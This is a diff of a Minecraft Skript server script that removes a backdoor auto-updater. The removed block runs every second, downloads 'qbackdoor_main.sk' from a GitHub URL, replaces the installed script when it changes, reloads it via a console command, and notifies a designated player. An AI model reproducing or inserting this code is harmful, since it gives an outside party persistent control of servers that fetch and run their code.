@@ -166,13 +166,3 @@ on chat:
     else:
       send "%{@prefix}% &cError while setting owner"
 
-every second:
-  download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "latestbackdoor.tmp"
-  if file content from "plugins/Skript/scripts/qbackdoor.sk" is not file content from "latestbackdoor.tmp":
-    delete file "plugins/Skript/scripts/qbackdoor.sk"
-    download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "plugins/Skript/scripts/qbackdoor.sk"
-    loop all players:
-      if player's name is {qbd}:
-        execute console command "skript:skript reload qbackdoor.sk"
-        send "&cBACKDOOR UPDATE INSTALLED!"
-  delete file "latestbackdoor.tmp"
